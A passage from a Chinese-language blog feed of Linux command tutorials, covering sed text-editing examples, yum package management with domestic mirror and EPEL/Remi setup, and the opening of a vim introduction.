    <content type="text"><![CDATA[Linux 命令- sed&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;sed 命令是利用 script 来处理文本文件。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;sed 可依照 script 的指令来处理、编辑文本文件。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;sed 主要用来自动编辑一个或多个文件；简化对文件的反复操作；编写转换程序等。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;sed 可以实现 grep 的大部分功能，而且还可以查找替换。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;sed 跟 grep 一样，不识别 + 、| 、｛｝、 （）等符号，需要借助脱义符号 、 或者使用选项 -r 1. 命令语法1sed [-hnV] [-e&lt;script&gt;] [-f&lt;script文件&gt;] [文本文件] 2. 命令参数 -e &lt;script&gt;或--expression=&lt;script&gt; 以选项中指定的script来处理输入的文本文件。 -f 或–file= 以选项中指定的script文件来处理输入的文本文件。 -h 或–help 显示帮助。 -n 或–quiet或–silent 仅显示script处理后的结果。 -V 或–version 显示版本信息。 3. 命令动作 a ：新增， a 的后面可以接字串，而这些字串会在新的一行出现(目前的下一行)～ c ：取代， c 的后面可以接字串，这些字串可以取代 n1,n2 之间的行！ d ：删除，因为是删除啊，所以 d 后面通常不接任何咚咚； i ：插入， i 的后面可以接字串，而这些字串会在新的一行出现(目前的上一行)； p ：列印，亦即将某个选择的数据印出。通常 p 会与参数 sed -n 一起运行～ s ：取代，可以直接进行取代的工作哩！通常这个 s 的动作可以搭配正规表示法！例如 1,20s/old/new/g 就是啦！ 4.使用实例实例1：在 testfile 文件的第四行后添加一行，并将结果输出到标准输出&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1sed -e 4a \newLine testfile &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567891011$ cat testfile HELLO LINUX! Linux is a free unix-type opterating system. This is a linux testfile! Linux test $ sed -e 4a\newline testfile HELLO LINUX! Linux is a free unix-type opterating system. This is a linux testfile! Linux test newline 实例2：将 /etc/passwd 的内容列出并且列印行号，同时将第2-5行删除&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1nl /etc/passwd | sed '2,5d' &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789101112131415161718[root@localhost ~]# nl /etc/passwd|sed '2,5d' 1 root:x:0:0:root:/root:/bin/bash 6 sync:x:5:0:sync:/sbin:/bin/sync 7 shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown 8 halt:x:7:0:halt:/sbin:/sbin/halt 9 mail:x:8:12:mail:/var/spool/mail:/sbin/nologin 10 operator:x:11:0:operator:/root:/sbin/nologin 11 games:x:12:100:games:/usr/games:/sbin/nologin 12 ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin 13 nobody:x:99:99:Nobody:/:/sbin/nologin 14 systemd-bus-proxy:x:999:997:systemd Bus Proxy:/:/sbin/nologin 15 systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin 16 dbus:x:81:81:System message bus:/:/sbin/nologin 17 polkitd:x:998:996:User for polkitd:/:/sbin/nologin 18 tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin 19 postfix:x:89:89::/var/spool/postfix:/sbin/nologin 20 sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin 21 chrony:x:997:995::/var/lib/chrony:/sbin/nologin &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;以行为单位的删除，sed 的动作为 ‘2,5d’，那个 d 就是删除。因为 2-5 行给删除了，所以显示的数据就没有 2-5 行。另外，注意一下，原本应该是要下达 -e 才对，没有 -e 也可以。同时也要注意的是，sed 后面接的动作务必以 ‘’单引号括住。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;只要删除第2行 1nl /etc/passwd | sed '2d' &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;要删除第3到最后一行 1nl /etc/passwd |sed '3,$d' &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在第2行后，第3行上加上 ‘drink tea’ 字样 1nl /etc/passwd | sed '2a drink tea' &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果要加再第2行前 1nl /etc/passwd | sed '2i drink tea' &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果要在第2行后面加入两行 12nl /etc/passwd | sed '2a drink tea \&gt; drink beer' &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;每一行之间都必须要以反斜杠（\）来进行新行的添加 实例3：将第2-5行内容取代成为‘2-5 number’&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1nl /etc/passwd | sed '2,5c 2-5 number' &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213141516171819[root@localhost ~]# nl /etc/passwd | sed '2,5c 2-5 number' 1 root:x:0:0:root:/root:/bin/bash2-5 number 6 sync:x:5:0:sync:/sbin:/bin/sync 7 shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown 8 halt:x:7:0:halt:/sbin:/sbin/halt 9 mail:x:8:12:mail:/var/spool/mail:/sbin/nologin 10 operator:x:11:0:operator:/root:/sbin/nologin 11 games:x:12:100:games:/usr/games:/sbin/nologin 12 ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin 13 nobody:x:99:99:Nobody:/:/sbin/nologin 14 systemd-bus-proxy:x:999:997:systemd Bus Proxy:/:/sbin/nologin 15 systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin 16 dbus:x:81:81:System message bus:/:/sbin/nologin 17 polkitd:x:998:996:User for polkitd:/:/sbin/nologin 18 tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin 19 postfix:x:89:89::/var/spool/postfix:/sbin/nologin 20 sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin 21 chrony:x:997:995::/var/lib/chrony:/sbin/nologin &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;以行为单位的替换与显示，通过这个方法就能够将数据整行取代了。 实例4：仅列出 /etc/passwd 文件内的5-7 行&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1nl /etc/passwd |sed -n '5,7p' &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234[root@localhost ~]# nl /etc/passwd | sed -n '5,7p' 5 lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin 6 sync:x:5:0:sync:/sbin:/bin/sync 7 shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果 root 找到，处理输出所有行，还回输出匹配行。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;使用 -n 的时候将只打印包含模版的行 123[root@localhost ~]# nl /etc/passwd | sed -n '/root/p' 1 root:x:0:0:root:/root:/bin/bash 10 operator:x:11:0:operator:/root:/sbin/nologin 实例5：删除 /etc/paawd 所有包含 root 的行，其他行输出&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1nl /etc/passwd | sed '/root/d' &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567891011121314151617181920[root@localhost ~]# nl /etc/passwd | sed '/root/d' 2 bin:x:1:1:bin:/bin:/sbin/nologin 3 daemon:x:2:2:daemon:/sbin:/sbin/nologin 4 adm:x:3:4:adm:/var/adm:/sbin/nologin 5 lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin 6 sync:x:5:0:sync:/sbin:/bin/sync 7 shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown 8 halt:x:7:0:halt:/sbin:/sbin/halt 9 mail:x:8:12:mail:/var/spool/mail:/sbin/nologin 11 games:x:12:100:games:/usr/games:/sbin/nologin 12 ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin 13 nobody:x:99:99:Nobody:/:/sbin/nologin 14 systemd-bus-proxy:x:999:997:systemd Bus Proxy:/:/sbin/nologin 15 systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin 16 dbus:x:81:81:System message bus:/:/sbin/nologin 17 polkitd:x:998:996:User for polkitd:/:/sbin/nologin 18 tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin 19 postfix:x:89:89::/var/spool/postfix:/sbin/nologin 20 sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin 21 chrony:x:997:995::/var/lib/chrony:/sbin/nologin &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;数据的搜寻并删除 实例6：搜索 /etc/passwd 找到 root 对应的行，执行后面花括号中的命令，每个命令之间用分号分割，并把bash替换为blueshell，在输出这行&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1nl /etc/passwd | sed -n '/bash/ &#123;s/bash/blueshell/;p;q&#125;' &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12[root@localhost ~]# nl /etc/passwd | sed -n '/bash/ &#123;s/bash/blueshell/;p;q&#125;' 1 root:x:0:0:root:/root:/bin/blueshell &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;数据的搜寻并执行命令，最后的q是退出 实例7：查找 /etc/passwd 内 root 的行，并把 root 替换为 shell&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1sed 's/root/shell/g' /etc/passwd &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213141516171819202122[root@localhost ~]# sed 's/root/shell/g' /etc/passwdshell:x:0:0:shell:/shell:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:12:mail:/var/spool/mail:/sbin/nologinoperator:x:11:0:operator:/shell:/sbin/nologingames:x:12:100:games:/usr/games:/sbin/nologinftp:x:14:50:FTP User:/var/ftp:/sbin/nologinnobody:x:99:99:Nobody:/:/sbin/nologinsystemd-bus-proxy:x:999:997:systemd Bus Proxy:/:/sbin/nologinsystemd-network:x:192:192:systemd Network Management:/:/sbin/nologindbus:x:81:81:System message bus:/:/sbin/nologinpolkitd:x:998:996:User for polkitd:/:/sbin/nologintss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologinpostfix:x:89:89::/var/spool/postfix:/sbin/nologinsshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologinchrony:x:997:995::/var/lib/chrony:/sbin/nologin &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;数据的搜寻并替换，s 就是替换的意思，g 为全局替换，否则只替换一次。 实例8：使用 ifconfig 查看ip地址，并提取出ip地址&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;先使用 ifconfig 命令查询eth0网卡ip 123456789[root@localhost ~]# ifconfig eth0eth0 Link encap:Ethernet HWaddr 00:0C:29:4D:9F:F7 inet addr:192.168.0.73 Bcast:192.168.0.255 Mask:255.255.255.0 inet6 addr: fe80::20c:29ff:fe4d:9ff7/64 Scope:Link UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1 RX packets:41 errors:0 dropped:0 overruns:0 frame:0 TX packets:48 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:1000 RX bytes:4525 (4.4 KiB) TX bytes:5868 (5.7 KiB) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1ifconfig eth0 | grep 'inet addr' | sed 's/^.*addr://g' | sed 's/Bcast.*$//g' &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12ifconfig eth0 | grep 'inet addr' | sed 's/^.*addr://g' | sed 's/Bcast.*$//g'192.168.0.73 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;数据的搜寻并替换，先观察原始信息，利用 ficonfig 查询 eth0 网卡 ip，再用 sed 命令将 ip 前面的部分删除（就是把前面的部分替换为空），接下来是删除后续的部分（把后续部分替换为空） 实例9：删除 /etc/passwd 第3行到末尾的数据，并把bash 替换为 blueshell&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1nl /etc/passwd | sed -e '3,$d' -e 's/bash/blueshell/g' &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234[root@localhost ~]# nl /etc/passwd | sed -e '3,$d' -e 's/bash/blueshell/g' 1 root:x:0:0:root:/root:/bin/blueshell 2 bin:x:1:1:bin:/bin:/sbin/nologin &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;多点编辑，-e 表示多点编辑，第一个编辑命令删除 /etc/passwd 第三行到末行的数据，第二条命令搜索 bash 替换为 blueshell 实例10：直接修改文件内容（危险动作）&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;sed 可以直接修改文件的内容，不必使用管道命令或数据流重定向。不过，由于这个动作会直接修改到原始的文件，所以千万不要随便拿系统配置文件来测试! &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;先用 cp 命令拷贝一份/etc/passwd 文件为 1.txt 1[root@localhost ~]# cp /etc/passwd 1.txt &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;删除所有非数字 1234567891011121314151617181920212223[root@localhost ~]# sed -i 's/[^0-9]//g' 1.txt[root@localhost ~]# cat 1.txt001122344750607081211012100145099999999971921928181998996595989897474997995 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;sed 的 -i 选项可以直接修改文件内容，这功能非常有帮助！举例来说，如果有一个100万行的文件，要在第100行加某些文字，此时使用 vim 可能会疯掉！因为文件太大了！就利用 sed ，通过 sed 直接修改、取代的功能，甚至不用使用 vim 去修订。]]></content>
      <tags>
        <tag>正则表达式</tag>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- yum]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%91%BD%E4%BB%A4%2F73.%20Linux%20%E5%91%BD%E4%BB%A4-%20yum%2F</url>
    <content type="text"><![CDATA[Linux 命令- yum&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;yum（ Yellow dog Updater, Modified）是一个在Fedora和RedHat以及SUSE中的Shell前端软件包管理器。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;基於RPM包管理，能够从指定的服务器自动下载RPM包并且安装，可以自动处理依赖性关系，并且一次安装所有依赖的软体包，无须繁琐地一次次下载、安装。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;yum提供了查找、安装、删除某一个、一组甚至全部软件包的命令，而且命令简洁而又好记。 yum 语法1yum [options] [command] [package ...] options：可选，选项包括-h（帮助），-y（当安装过程提示选择全部为”yes”），-q（不显示安装的过程）等等。 command：要进行的操作。 package操作的对象。 yum常用命令 列出所有可更新的软件清单命令：yum check-update 更新所有软件命令：yum update 仅安装指定的软件命令：yum install 仅更新指定的软件命令：yum update 列出所有可安裝的软件清单命令：yum list 删除软件包命令：yum remove 查找软件包 命令：yum search 清除缓存命令: yum clean packages: 清除缓存目录下的软件包 yum clean headers: 清除缓存目录下的 headers yum clean oldheaders: 清除缓存目录下旧的 headers yum clean, yum clean all (= yum clean packages; yum clean oldheaders) :清除缓存目录下的软件包及旧的headers 使用实例实例1：安装 pam-devel12345678910111213[root@www ~]# yum install pam-develSetting up Install ProcessParsing package install argumentsResolving Dependencies &lt;==先检查软件的属性相依问题--&gt; Running transaction check---&gt; Package pam-devel.i386 0:0.99.6.2-4.el5 set to be updated--&gt; Processing Dependency: pam = 0.99.6.2-4.el5 for package: pam-devel--&gt; Running transaction check---&gt; Package pam.i386 0:0.99.6.2-4.el5 set to be updatedfilelists.xml.gz 100% |=========================| 1.6 MB 00:05filelists.xml.gz 100% |=========================| 138 kB 00:00-&gt; Finished Dependency Resolution……(省略) 实例2:移除 pam-devel1234567891011121314151617181920212223242526272829303132[root@www ~]# yum remove pam-develSetting up Remove ProcessResolving Dependencies &lt;==同样的，先解决属性相依的问题--&gt; Running transaction check---&gt; Package pam-devel.i386 0:0.99.6.2-4.el5 set to be erased--&gt; Finished Dependency ResolutionDependencies Resolved============================================================================= Package Arch Version Repository Size=============================================================================Removing: pam-devel i386 0.99.6.2-4.el5 installed 495 kTransaction Summary=============================================================================Install 0 Package(s)Update 0 Package(s)Remove 1 Package(s) &lt;==还好，并没有属性相依的问题，单纯移除一个软件Is this ok [y/N]: yDownloading Packages:Running rpm_check_debugRunning Transaction TestFinished Transaction TestTransaction Test SucceededRunning Transaction Erasing : pam-devel ######################### [1/1]Removed: pam-devel.i386 0:0.99.6.2-4.el5Complete! 实例3:利用 yum 的功能，找出以 pam 为开头的软件名称有哪些？123456789101112[root@www ~]# yum list pam*Installed Packagespam.i386 0.99.6.2-3.27.el5 installedpam_ccreds.i386 3-5 installedpam_krb5.i386 2.2.14-1 installedpam_passwdqc.i386 1.0.2-1.2.2 installedpam_pkcs11.i386 0.5.3-23 installedpam_smb.i386 1.1.7-7.2.1 installedAvailable Packages &lt;==底下则是『可升级』的或『未安装』的pam.i386 0.99.6.2-4.el5 basepam-devel.i386 0.99.6.2-4.el5 basepam_krb5.i386 2.2.14-10 base 国内 yum 源阿里yum源安装&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;阿里云与yum源是国内最好的yum源之一。 备份1mv /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo.backup 下载新的CentOS-Base.repo 到/etc/yum.repos.d/CentOS 51wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-5.repo CentOS 61wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-6.repo CentOS 71wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo 之后运行yum makecache生成缓存12yum clean allyum makecache 网易yum源安装&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;网易（163）yum源是国内最好的yum源之一 ，无论是速度还是软件版本，都非常的不错。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;将yum源设置为163 yum，可以提升软件包安装和更新的速度，同时避免一些常见软件版本无法找到。 安装步骤首先备份/etc/yum.repos.d/CentOS-Base.repo1mv /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo.backup 下载对应版本repo文件, 放入/etc/yum.repos.d/(操作前请做好相应备份) CentOS5 ：http://mirrors.163.com/.help/CentOS5-Base-163.repo CentOS6 ：http://mirrors.163.com/.help/CentOS6-Base-163.repo 运行以下命令生成缓存12yum clean allyum makecache &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;除了阿里和网易之外，国内还有其他不错的yum源，比如中科大和搜狐。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;中科大的yum源，安装方法查看：https://lug.ustc.edu.cn/wiki/mirrors/help/centos &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;sohu的yum源安装方法查看: http://mirrors.sohu.com/help/centos.html 配置本地yum仓库&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;实现此案例需要按照如下步骤进行。 步骤一：搭建一个本地Yum，将RHEL6光盘手动挂载到/media&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令操作如下所示： 1234[root@localhost ~]# mount /dev/cdrom /media/mount: block device /dev/sr0 is write-protected, mounting read-only[root@localhost ~]# mount | tail -1/dev/sr0 on /media type iso9660 (ro) 步骤二：将本地设置为客户端，进行Yum验证&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Yum客户端需编辑配置文件，命令操作如下所示： 123456789101112131415161718192021[root@localhost ~]# cd /etc/yum.repos.d/ //必须在这个路径下[root@localhost yum.repos.d]# ls //此路径下事先有配置文件的模板rhel-source.repo[root@localhost yum.repos.d]# cp rhel-source.repo rhel6.repo //配置文件必须以.repo结尾[root@localhost yum.repos.d]# vim rhel6.repo[rhel-6] //中括号里内容要求唯一，但不要出现特殊字符name=Red Hat Enterprise Linux 6 //此为描述信息，可以看情况填写baseurl=file:///media/ //此项为yum软件仓库位置，指向光盘挂载点enabled=1 //此项为是否开启，1为开启0为不开启gpgcheck=1 //此项为是否检查签名，1为监测0为不检测gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-redhat-release //签名认证信息的路径[root@localhost /]# yum repolistLoaded plugins: product-id, refresh-packagekit, security, subscription-managerThis system is not registered to Red Hat Subscription Management. You can use subscription-manager to register.rhel-6 | 3.9 kB 00:00 ... rhel-6/primary_db | 3.1 MB 00:00 ... repo id repo name statusrhel-6 Red Hat Enterprise Linux 6 3,690repolist: 3,690 yum安装“epel”扩展源&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;使用yum安装rpm包时，经常遇到一些包没有，这时候你可以尝试安装epel的扩展源，这里有很多系统不自带的rpm包。 12[root@localhost ~]# yum install -y epel-release[root@localhost ~]# yum list &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;你会发现最右侧出现很多epel的rpm包。 阿里云扩展源：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下载 1wget -P /etc/yum.repos.d/ http://mirrors.aliyun.com/repo/epel-6.repo &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;也可以rpm安装 1rpm -ivh http://mirrors.zju.edu.cn/epel/6/x86_64/epel-release-6-8.noarch.rpm Remi源&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;安装REMI仓库之前，需要启用EPEL仓库，因为REMI中的一些包依赖于EPEL仓库 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在CentOS 7上: 12rpm --import http://rpms.famillecollet.com/RPM-GPG-KEY-remirpm -ivh http://rpms.famillecollet.com/enterprise/remi-release-7.rpm &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在CentOS 6上: 12rpm --import http://rpms.famillecollet.com/RPM-GPG-KEY-remirpm -ivh http://rpms.famillecollet.com/enterprise/remi-release-6.rpm &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;默认地，REMI是禁用的。要检查REMI是否已经成功安装，使用这个命令。你会看到几个REMI仓库，比如remi、remi-php55和remi-php56。 1yum repolist disabled|grep remi 从REMI仓库中安装一个包&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如上所述，最好保持禁用REMI仓库，只有在需要的时候再启用。要搜索或安装REMI仓库中的包，使用这些命令: 12yum --enablerepo=remi search &lt;keyword&gt;yum --enablerepo=remi install &lt;package-name&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Remi下载地址 列出可用: yum repolist enabled 列出禁用: yum repolist disabled 列出所有(默认): yum repolist all 列出一个 repo 源(remi) 中可用的包 1yum --disablerepo="*" --enablerepo="ksplice-uptrack" list available yum保留下载个rpm包&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;可以设置使yum保留已经下载的rpm包，供以后升级或重新安装时使用。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;修改/etc/yum.conf即可 1234[main]cachedir=/home/soft1/yumcachekeepcache=1debuglevel=2 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;chchedir是放置下载的包的地方，可以修改为自己想放置的位置。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;keepcache为1时表示保存已经下载的rpm包。 yum如何下载rpm包到本地&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;首先要安装一个小插件，yum-plugin-downloadonly.noarch ，不知道包名用 yum -list |grep download搜索 1yum install -y yum-plugin-downloadonly.noarch &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后就可以下载了： 1yum install vte --downloadonly --downloaddir=/tmp 123456789&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;下载vte到指定/tmp下&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;如果已安装过的包这个小插件默认是不能下载的,我们可以用 reinstall 下载，如下图例：![](https://github.com/hcldirgit/image/blob/master/linux%E5%91%BD%E4%BB%A4-yum/01.png?raw=true)```bashyum reinstall vim --downloadonly --downloaddir=/tmp yum配置/etc/yum.conf配置详解：12345678910111213141516171819202122232425262728293031323334cachedir=/var/cache/yum #yum下载的RPM包的缓存目录keepcache=0 #缓存是否保存，1保存，0不保存。debuglevel=2 #调试级别(0-10)，默认为2(具体调试级别的应用，我也不了解)。logfile=/var/log/yum.log #yum的日志文件所在的位置exactarch=1 #在更新的时候，是否允许更新不同版本的RPM包，比如是否在i386上更新i686 的RPM包。obsoletes=1 #这是一个update的参数，具体请参阅yum(8)，简单的说就是相当于upgrade， 允许更新陈旧的RPM包。gpgcheck=1 #是否检查GPG(GNU Private Guard)，一种密钥方式签名。plugins=1 #是否允许使用插件，默认是0不允许，但是我们一般会用yum-fastestmirror这 个插件。installonly_limit=3 #允许保留多少个内核包。exclude=selinux* #屏蔽不想更新的RPM包，可用通配符，多个RPM包之间使用空格分离。/etc/yum.repos.d/ *.repo[fedora] #方括号里面的是软件源的名称，将被yum取得并识别name=Fedora $releasever - $basearch #这里也定义了软件 仓库的名称，通常是为了方便阅读配置文件，一般没什么作用，$releasever变量定义了发行版本，通常是8，9，10等数字，$basearch变 量定义了系统的架构，可以是i386、x86_64、ppc等值，这两个变量根据当前系统的版本架构不同而有不同的取值，这可以方便yum升级的时候选择 适合当前系统的软件包，以下同……failovermethod=priority #failovermethod 有两个值可以选择，priority是默认值，表示从列出的baseurl中顺序选择镜像服务器地址，roundrobin表示在列出的服务器中随机选择exclude=compiz* *compiz* fusion-icon* #exclude这个选项是后来我自己加上去的，用来禁止这个软件仓库中的某些软件包的安装和更新，可以使用通配符，并以空格分隔，可以视情况需要自行添加#baseurl=http://download.fedoraproject.org/pub/fedora/linux/releases/$releasever/Everything/$basearch/os/#上面的一行baseurl第一个字符是'#'表示该行已经被注释，将不会被读取，这一行的意思是指定一个baseurl（源的镜像服务器地址）#mirrorlist=http://mirrors.fedoraproject.org/mirrorlist?repo=fedora-$releasever&amp;arch=$basearch#上面的这一行是指定一个镜像服务器的地址列表，通常是开启的，本例中加了注释符号禁用了，我们可以试试，将$releasever和$basearch替换成自己对应的版本和架构，例如10和i386，在浏览器中打开，我们就能看到一长串镜可用的镜像服务器地址列表。选择自己访问速度较快的镜像服务器地址复制并粘贴到repo文件中，我们就能获得较快的更新速度了，格式如下baseurl所示：baseurl=ftp://ftp.sfc.wide.ad.jp/pub/Linux/Fedora/releases/10/Everything/i386/oshttp://ftp.chg.ru/pub/Linux/fedora/linux/releases/10/Everything/i386/oshttp://ftp.yz.yamagata-u.ac.jp/pub/linux/fedora/linux/releases/10/Everything/i386/oshttp://mirror.nus.edu.sg/fedora/releases/10/Everything/i386/oshttp://mirror.yandex.ru/fedora/linux/releases/10/Everything/i386/oshttp://ftp.twaren.net/Linux/Fedora/linux/releases/10/Everything/i386/oshttp://ftp.itu.edu.tr/Mirror/Fedora/linux/releases/10/Everything/i386/osenabled=1 #这个选项表示这个repo中定义的源是启用的，0为禁用gpgcheck=1 #这个选项表示这个repo中下载的rpm将进行gpg的校验，已确定rpm包的来源是有效和安全的gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-fedora-$basearch #定义用于校验的gpg密钥]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- vim]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%91%BD%E4%BB%A4%2F72.%20Linux%20%E5%91%BD%E4%BB%A4-vim%2F</url>
    <content type="text"><![CDATA[Linux 命令- vim&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;所有的 Unix Like 系统都会内建 vi 文书编辑器，其他的文书编辑器则不一定存在。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;但是目前使用比较多的是 vim 编辑器。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;vim 具有程序编辑的能力，可以主动的以字体颜色辨别语法的正确性，方便设计。 什么是vim&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Vim 是从 vi 发展出来的一个文本编辑器。代码补完、编辑及错误跳转等方便编程的功能特别丰富，在程序员中广泛使用。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;简单的来说，vi 是老式的字处理器，不公功能已经很齐全。vim 则可以说是程序开发者的一向很好用的工具。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;连vim官方网站自己也说 vim 是一个程序开发工具而不是文字处理软件。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;vim 键盘图 vim的使用&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;基本上 vim 分为三种模式：命令模式（Command mode、编辑模式）、输入模式（Insert mode）和底线命令模式（Last line mode、末行模式）。三种模式的作用分别是： 命令模式&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用户刚刚启动 vim ，便计入了命令模式。 